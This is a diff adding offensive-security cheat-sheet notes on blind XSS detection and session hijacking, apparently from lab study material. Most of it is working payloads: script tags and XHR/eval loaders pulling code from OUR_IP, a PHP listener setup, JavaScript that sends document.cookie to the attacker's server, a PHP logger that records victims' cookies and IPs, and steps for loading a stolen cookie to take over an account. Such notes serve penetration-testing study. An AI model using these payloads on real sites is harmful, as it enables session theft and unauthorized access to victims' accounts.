@@ -192,3 +192,77 @@ This will save the creds as creds.txt
 
 ### Session Hijacking
 
+If a malicious user obtains the cookie data from the victim's browser, they may be able to gain logged-in access with the victim's user without knowing their credentials.
+
+### Blind XSS Detection
+
+If say the xss is popped from a panel/page we don't have access to we can send remote loading scripts to see the interaction and the execution of the blind xss.
+
+```
+<script src="http://OUR_IP/script.js"></script>
+```
+
+If we get a request for /username, then we know that the username field is vulnerable to XSS, and so on
+
+Other remote payloads from payloadallthethings
+
+```
+<script src=http://OUR_IP></script>
+'><script src=http://OUR_IP></script>
+"><script src=http://OUR_IP></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+<script>$.getScript("http://OUR_IP")</script>
+```
+
+before sending we should start up our php server
+
+```
+mkdir /tmp/tmpserver
+cd /tmp/tmpserver
+sudo php -S 0.0.0.0:80
+```
+
+Now we can start testing these payloads one by one by using one of them for all of input fields and appending the name of the field after our IP
+
+example:
+
+```
+<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
+<script src=http://OUR_IP/username></script> #this goes inside the username field
+```
+
+### Session Hijacking
+
+Once we find a working xxs we can send a specially crafted payload that will send their cookie info to our server running the php web server. 
+
+These will be hosted on our php server, either one can work, saved as script.js:
+
+```
+document.location='http://OUR_IP/index.php?c='+document.cookie;
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
+
+Then we send a payload to call it and run this javascript
+
+```
+<script src=http://OUR_IP/script.js></script>
+```
+
+To add additional functionality to separate the cookie values we can do so with this:
+
+```
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+
+we can use this cookie on the login.php page to access the victim's account. To do so, once we navigate to /hijacking/login.php, we can click Shift+F9 in Firefox to reveal the Storage bar in the Developer Tools. Then, we can click on the + button on the top right corner and add our cookie, where the Name is the part before = and the Value is the part after = from our stolen cookie.
